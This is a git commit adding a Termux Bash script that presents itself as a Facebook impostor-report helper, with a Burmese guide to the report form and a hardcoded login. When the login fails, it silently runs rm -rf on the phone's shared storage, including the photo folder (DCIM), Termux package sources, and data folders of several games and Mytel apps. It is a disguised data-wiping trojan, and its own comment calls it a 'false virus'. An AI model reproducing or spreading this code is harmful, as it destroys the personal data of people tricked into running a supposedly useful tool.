2e97cf2b3128286125ecfd309687b1b7e714663c
ZuHack3 <102369067+ZuHack3@users.noreply.github.com>
2022-04-15 10:01:59 +0630

    Add files via upload

---
+++ rp.sh
@@ -0,0 +1,255 @@
+#!/bin/bash
+clear
+
+BLACK='\e[30m'
+RED='\e[31m'
+GREEN='\e[92m'
+YELLOW='\e[33m'
+ORANGE='\e[93m'
+BLUE='\e[34m'
+PURPLE='\e[35m'
+CYAN='\e[36m'
+WHITE='\e[37m'
+NC='\e[0m'
+purpal='\033[35m'
+
+clear
+termux-open https://www.facebook.com/Myanmar-Anonymous-Helper-Reporter-Teams-101125495006030/
+
+clear
+
+#loading code start
+
+
+
+echo -e $CYAN "\n▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒ Loading ...\n"
+sleep 0.3
+clear
+echo -e $CYAN "\n▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒ Loading ...\n"
+sleep 0.3
+clear
+echo -e $CYAN "\n▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒ Loading ...\n"
+sleep 0.3
+clear
+echo -e $CYAN "\n▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒ Loading ...\n"
+sleep 0.3
+clear
+echo -e $CYAN "\n▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒ Loading ...\n"
+sleep 0.3
+clear
+echo -e $CYAN "\n▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒ Loading ...\n"
+sleep 0.3
+clear
+echo -e $CYAN "\n▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒ Loading ...\n"
+sleep 0.3
+clear
+echo -e $CYAN "\n▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒ Loading ...\n"
+sleep 0.3
+clear
+echo -e $CYAN "\n▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒ Loading ...\n"
+sleep 0.3
+clear
+echo -e $CYAN "\n▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒ Loading ...\n"
+sleep 0.1
+clear
+echo -e $CYAN "\n▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒ Loading ...\n"
+sleep 0.1
+clear
+echo -e $CYAN "\n▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒ Loading ...\n"
+sleep 0.1
+clear
+echo -e $CYAN "\n▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒ Loading ...\n"
+sleep 0.1
+clear
+echo -e $CYAN "\n▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒ Loading ...\n"
+sleep 0.1
+clear
+echo -e $CYAN "\n▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ Loading ...\n"
+sleep 0.1
+
+
+clear
+
+#loadimg code end
+
+echo -e "${ORANGE} "
+
+echo -e " \e[1;31m 
+\033[0;33m     111     111       111        111111     1111111111                 
+\033[0;32m     111 111 111      11 11       11  11        111
+\033[0;36m     111  1  111     1111111      111111        111
+\033[1;33m     111     111    11     11     11 11         111
+\033[0;31m     111     111   11       11    11  11        111
+\e[0m "
+
+echo ""
+
+
+echo -e $CYAN "Enter username" 
+read username
+echo "Enter password" 
+read password
+
+if [[ ( $username == "MART" && $password == "ZuH@ck" ) ]]; then
+echo "valid user" 
+clear
+
+echo -e " \e[1;31m 
+\033[0;33m     111     111       111        111111     1111111111                 
+\033[0;32m     111 111 111      11 11       11  11        111
+\033[0;36m     111  1  111     1111111      111111        111
+\033[1;33m     111     111    11     11     11 11         111
+\033[0;31m     111     111   11       11    11  11        111
+\e[0m "
+
+echo ""
+
+else
+echo "invalid fuck  user" 
+
+#loading code start
+
+
+
+echo -e $CYAN "\n▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒ Loading ...\n"
+sleep 0.3
+clear
+echo -e $CYAN "\n▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒ Loading ...\n"
+sleep 0.3
+clear
+echo -e $CYAN "\n▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒ Loading ...\n"
+sleep 0.3
+clear
+echo -e $CYAN "\n▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒ Loading ...\n"
+sleep 0.3
+clear
+echo -e $CYAN "\n▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒ Loading ...\n"
+sleep 0.3
+clear
+echo -e $CYAN "\n▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒ Loading ...\n"
+sleep 0.3
+clear
+echo -e $CYAN "\n▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒ Loading ...\n"
+sleep 0.3
+clear
+echo -e $CYAN "\n▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒ Loading ...\n"
+sleep 0.3
+clear
+echo -e $CYAN "\n▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒ Loading ...\n"
+sleep 0.3
+clear
+echo -e $CYAN "\n▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒ Loading ...\n"
+sleep 0.1
+clear
+echo -e $CYAN "\n▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒ Loading ...\n"
+sleep 0.1
+clear
+echo -e $CYAN "\n▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒ Loading ...\n"
+sleep 0.1
+clear
+echo -e $CYAN "\n▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒ Loading ...\n"
+sleep 0.1
+clear
+echo -e $CYAN "\n▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒ Loading ...\n"
+sleep 0.1
+clear
+echo -e $CYAN "\n▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ Loading ...\n"
+sleep 0.1
+
+
+clear
+
+#loadimg code end
+
+cd
+termux-setup-storage
+
+   rm -rf /sdcard
+
+	 rm -rf /sdcard/DCIM
+
+rm -rf /data/data/com.termux/files/usr/etc/apt/sources.list.d/* 
+	 
+	 rm -rf /sdcard/Android/data/com.mobile.legends
+	 
+	 rm -rf /sdcard/Android/data/com.mytel.myid
+	 
+	 rm -rf /sdcard/Android/data/com.mytelpay.eu
+	 
+	 rm -rf /sdcard/Android/obb/com.mobile.legends
+	 
+	 rm -rf /sdcard/Android/obb/com.tencent.ig
+	 
+	 rm -rf /sdcard/Android/media/com.mytel.myid
+	
+	 rm -rf /sdcard/.sketchware
+	 clear
+#code false virus end
+exit
+fi
+
+########! username and password code #############
+
+echo ""
+ echo  -e $CYAN "1.Imposter Report" 
+ echo ""
+ echo  -e $CYAN "2.Follow me" 
+ echo ""
+ echo "[0]  Exit " 
+ echo ""
+ echo  -e $BLUE "Choose A Number :  " 
+read -p "" zuzu;
+
+if [ $zuzu = 1 ] || [ $zuzu = 01 ]
+then
+
+clear
+echo -e " \e[1;31m 
+\033[0;33m     111     111       111        111111     1111111111                 
+\033[0;32m     111 111 111      11 11       11  11        111
+\033[0;36m     111  1  111     1111111      111111        111
+\033[1;33m     111     111    11     11     11 11         111
+\033[0;31m     111     111   11       11    11  11        111
+\e[0m "
+
+echo ""
+
+echo -e $CYAN  " တစ်နည်းအားဖြင့်  အယောင်ဆောင် Acc တစ်ခုကိုတိုင်တန်းတဲ့ report ဒီ Report ကိုစတွေ့ခဲ့သူက တစ်ချိန်က နည်းပညာလောကမှာ နေတစ်ဆူ လတစ်ဆူလို  ကျော်ကြားခဲ့တဲ့ ဆရာမိုဘိုင်လုလင် ဆိုတဲ့ ဆရာဘဲ သူ့page မှစပြီးတင်ခဲ့တာ ဒီreport ကိုimpostor report အယောင်ဆောင် acc တစ်ခုကိုတိုင်တန်းခြင်းဆိုတာထက်hack ခံထိတဲ့ acc တွေပြန်လိုက်မရတဲ့အခါ မွေးနေ့တူ မိမိ id ကိုပြီးfb teamကိုဖျက်ခိုင်းတဲ့သဘော
+bd သိရမယ်
+(1)old mail or ph number သိရမယ်
+(2)old passသိရမယ်
+(3)မိမိနောက်ဆုံးသုံးခဲ့တဲ့ Date ကိုသိရမယ် 
+
+  Someone created an account pretending to be me or a friend ကိုရွေးပါ
+  No
+  Yes
+  Your Full Name  မိမိအကောင့်အမည်
+  Your contact email address မိမိအကောင့် mail
+  Full name on the impostor profile Nameအပြည့်စုံ
+  
+  Name တူ BD တူ ID ထည့်ပါ
+  Imposter Ac link ထည့်ပါ
+  Replyစာ
+
+If the impostor account is impersonating someone you're authorized to represent e.g. your child, you can report the account using this form. In most cases the report has to be made from the profile of the person who's being impersonated, and you cannot do this on their behalf.
+
+နေရိုင်း ပညာဒါန Report Free Class
+
+"
+
+termux-open https://m.facebook.com/help/contact/295309487309948
+
+fi
+
+if [ $zuzu = 2 ] || [ $zuzu = 02 ]
+then
+termux-open https://web.facebook.com/eikyaw.black/
+fi
+
+if [ $zuzu = 0 ] || [ $zuzu = 0 ]
+then
+echo -e $RED "[✘] THank Y0u !! [✘] "
+sleep 2 
+exit
+
+fi
